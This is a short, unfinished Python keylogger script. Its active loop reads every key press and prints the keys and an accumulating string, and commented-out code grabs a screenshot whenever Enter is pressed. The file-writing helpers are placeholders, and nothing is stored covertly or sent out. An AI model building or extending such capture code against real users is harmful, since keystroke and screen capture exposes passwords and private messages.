import keyboard
import datetime
from PIL import ImageGrab

session = 1
def keylogger():
    text = ''
    while True:
        event = keyboard.read_event()
        if event.event_type == "down":
            print(event.name)
            text += event.name
            print(text)
def time():
    current_time = datetime.datetime.now()
    print(current_time)

def create_file():
    with open("counter.pickle", "w") as file:
        file.write('logs')

def edit_logs():
    with open("logs", "w") as file:
        file.write('1')

# def take_screenshot():
#     screenshot = ImageGrab.grab()
#     screenshot.save("screenshot.png")
#     print("Скриншот сохранен")
#
# def on_key(event):
#     if event.name == "enter":
#         take_screenshot()
#
# keyboard.on_press(on_key)
# keyboard.wait('esc')



#keyboard.on_press(on_key)
#keyboard.wait('esc')

keylogger()
#time()
#create_file()
#edit_logs()
